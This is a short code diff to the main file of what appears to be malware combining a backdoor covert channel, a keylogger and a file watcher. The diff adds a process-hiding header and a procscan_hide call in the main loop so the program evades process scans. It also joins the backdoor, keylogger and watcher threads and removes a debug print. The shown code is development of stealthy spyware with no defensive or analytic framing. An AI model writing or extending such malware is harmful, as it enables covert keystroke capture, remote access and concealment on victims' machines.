@@ -2,6 +2,7 @@
 #include "covert_channel/backdoor_channel.h"
 #include "file_watcher/file_watcher.h"
 #include "keylogger/keylogger.h"
+#include "hiding/includes/hiding.h"
 #include <thread>
 
 void spawn() {
@@ -19,11 +20,14 @@ void spawn() {
     oss << "/proc/" << getpid() << "/status";
 
     pw.watch(oss.str().c_str(), IN_ACCESS);
+    bd_thread.join();
+    kl_thread.join();
+    fw_thread.join();
 }
 
-int main() {
+int main(int argc, char** argv) {
     while (1) {
+        procscan_hide(argv);
         spawn();
-        std::cout << "after spawn killed" << std::endl;
     }
 }
